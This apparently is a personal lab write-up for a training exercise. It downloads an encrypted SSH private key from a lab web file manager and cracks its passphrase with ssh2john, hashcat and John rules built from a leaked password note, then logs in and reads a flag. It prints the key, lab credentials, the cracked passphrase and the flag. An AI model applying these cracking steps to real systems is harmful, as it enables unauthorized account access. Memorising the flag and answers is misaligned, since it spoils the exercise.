@@ -1,0 +1,110 @@
+Questions 1
+Follow the steps outlined in this section to get access to VM #1 (BRUTE) on port 2222 with SSH by cracking the passphrase of the private key. Find the flag in the home directory of the user dave.
+
+Follow to tutorial, credentials had been provided for victim machine
+http://192.168.190.201:8080
+user:121212
+
+Access to tinyfilemanager and download the id_rsa 
+
+http://192.168.190.201:8080/note.txt
+Dave's password list:
+
+Window
+rickc137
+dave
+superdave
+megadave
+umbrella
+
+Note to myself:
+New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character
+
+http://192.168.190.201:8080/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+3zCGMg==
+-----END OPENSSH PRIVATE KEY-----
+
+chmod 600 id_rsa
+ssh2john id_rsa > ssh.hash 
+cat ssh.hash
+
+# Fine the Hashcat mode of the id_rsa passphrase
+hashcat -h | grep -i "ssh"
+22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)                      | Private Key
+We can notice that ssh is start with "$6$" which is mode 22921
+
+Then we might need to create our rules based on the password policy got from note.txt
+We notice dave used "137" for the three number in the "rickc137" password
+Then Password required to Capitalized where "Window" password caps start from first letter.
+There is no special character being uised, so we will just use the most common special characters "!", "@", "3" first.
+
+nano ssh.rule
+c $1 $3 $7 $!
+c $1 $3 $7 $@
+c $1 $3 $7 $#
+
+# Use back the password file and create a new combinations
+nano ssh.Passwords
+Window
+rickc137
+dave
+superdave
+megadave
+umbrella
+
+hashcat -m 22921 ssh.hash ssh.Passwords -r ssh.rule --force
+Unfortunately, we receive an error indicating that our hash caused a "Token length exception" Several discussions2 suggest that modern private keys and their corresponding passphrases are created with the aes-256-ctr3 cipher, which Hashcat's mode 22921 does not support.
+
+To be able to use the previously created rules in JtR, we need to add a name for the rules and append them to the /etc/john/john.conf configuration file. We'll name the rule sshRules with a "List.Rules" rule naming syntax. We'll use sudo and sh -c to append the contents of our rule file into /etc/john/john.conf.
+
+nano ssh.rule
+[List.Rules:sshRules]
+c $1 $3 $7 $!
+c $1 $3 $7 $@
+c $1 $3 $7 $#
+
+sudo sh -c 'cat /home/kali/Desktop/ssh.rule >> /etc/john/john.conf'
+john --wordlist=ssh.password --rules=sshrules ssh.hash
+Umbrella137!     (id_rsa)  
+
+ssh dave@192.168.190.201 -p2222 -i id_rsa
+8b5f6208a3e8:~$ cat flag.txt
+OS{fb8c21e487f6a4ccfc345f45765a5c59}
+
